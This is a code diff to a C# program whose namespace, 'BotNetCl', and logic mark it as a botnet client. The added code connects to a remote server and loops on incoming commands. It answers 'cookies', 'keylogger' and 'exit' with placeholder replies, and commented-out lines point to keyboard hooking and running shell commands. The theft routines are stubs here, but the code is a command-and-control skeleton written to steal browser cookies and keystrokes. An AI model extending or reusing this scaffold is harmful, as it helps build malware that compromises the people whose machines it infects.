@@ -12,7 +12,7 @@ using System.Windows.Forms;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium;
 using System.Reflection.Emit;
-
+using OpenQA.Selenium.DevTools.V115.Page;
 
 namespace BotNetCl
 {
@@ -271,15 +271,34 @@ namespace BotNetCl
 
                 //stream.Write(data, 0, data.Length);
 
-                //// 3. receive
+                // 3. receive
                 //data = new byte[BUFFER_SIZE];
                 //stream.Read(data, 0, BUFFER_SIZE);
 
                 //Console.WriteLine(encoding.GetString(data));
 
-                // 4. Close
+                // 4.Close
                 //stream.Close();
                 //client.Close();
+
+                ///////////////////////////////////////////
+                Stream stream = client.GetStream();
+
+                Console.WriteLine("Connected to Y2Server.");
+                Console.Write("Enter your name: ");
+
+                string str = Console.ReadLine();
+
+                // 2. send
+                byte[] data = encoding.GetBytes(str);
+
+                stream.Write(data, 0, data.Length);
+
+                // 3. receive
+                data = new byte[BUFFER_SIZE];
+                stream.Read(data, 0, BUFFER_SIZE);
+
+                Console.WriteLine(encoding.GetString(data));
             }
 
             catch (Exception ex)
@@ -390,7 +409,7 @@ namespace BotNetCl
         {
             //getCommandPrompt();
             //Console.WriteLine(RunCommandAndGetOutput("echo %username%"));
-           // connectsocket();
+            // connectsocket();
             // HookKeyboard();
             //string s = Console.ReadLine();
             //Console.WriteLine("echo %username%");
@@ -407,7 +426,7 @@ namespace BotNetCl
             //ctrl k ctrl d format code
             // ctrl f5
 
-
+            //  connectsocket();
 
             try
             {
@@ -423,39 +442,74 @@ namespace BotNetCl
                 //string str = Console.ReadLine();
 
                 //// 2. send
-                //byte[] data = encoding.GetBytes(str);
+                byte[] data;
 
                 //stream.Write(data, 0, data.Length);
 
                 // 3. receive
-                while(true)
+                while (true)
                 {
-                    byte[] data = new byte[BUFFER_SIZE];
+                    data = new byte[BUFFER_SIZE];
                     stream.Read(data, 0, BUFFER_SIZE);
                     string command = encoding.GetString(data);
 
-                    Console.WriteLine(command);
-                    //if(command == "cookies")
-                    //{
-                    //    data = encoding.GetBytes("cookies tra ve");
-                    //    //stream.Write(data, 0, data.Length);
+                    Console.Write(command.Trim()) ;
+                    Console.Write("a");
+                    if (command.StartsWith("cookies"))
+                    {
+                        // data = new byte[BUFFER_SIZE];
+
+                        //data = encoding.GetBytes("cookies tra ve");
+
+
+                        string str = " cookies tra ve";
+
+                        data = encoding.GetBytes(str);
+                        stream.Write(data, 0, data.Length);
+                        Console.WriteLine("xong cookies");
                         
-                    //}   
-                    //else if(command == "keylogger")
-                    //{
-                    //     data = encoding.GetBytes("keylogger tra ve");
-                    //    stream.Write(data, 0, data.Length);
-                    //}    
-                }    
-                
+
+                    }
+                    else if (command.StartsWith("keylogger"))
+                    {
+                        //data = new byte[BUFFER_SIZE];
+                        //data = encoding.GetBytes("keylogger tra ve");
+                        //stream.Write(data, 0, data.Length);
 
 
-                //Console.WriteLine(encoding.GetString(data));
+                        string str = " keylogger tra ve";
 
-                // 4. Close
-                //stream.Close();
-                //client.Close();
+                        data = encoding.GetBytes(str);
+                        stream.Write(data, 0, data.Length);
+                        Console.WriteLine("xong keylogger");
+                    }
+                    else if (command.StartsWith("exit"))
+                    {
+                        //data = new byte[BUFFER_SIZE];
+                        //data = encoding.GetBytes("keylogger tra ve");
+                        //stream.Write(data, 0, data.Length);
+
+
+                        string str = "done";
+
+                        data = encoding.GetBytes(str);
+                        stream.Write(data, 0, data.Length);
+                        Console.WriteLine("xong keylogger");
+                        client.Close();
+
+                    }
+                }
+
             }
+
+
+
+            //    //Console.WriteLine(encoding.GetString(data));
+
+            //    // 4. Close
+            //    //stream.Close();
+            //    //client.Close();
+            //}
 
             catch (Exception ex)
             {
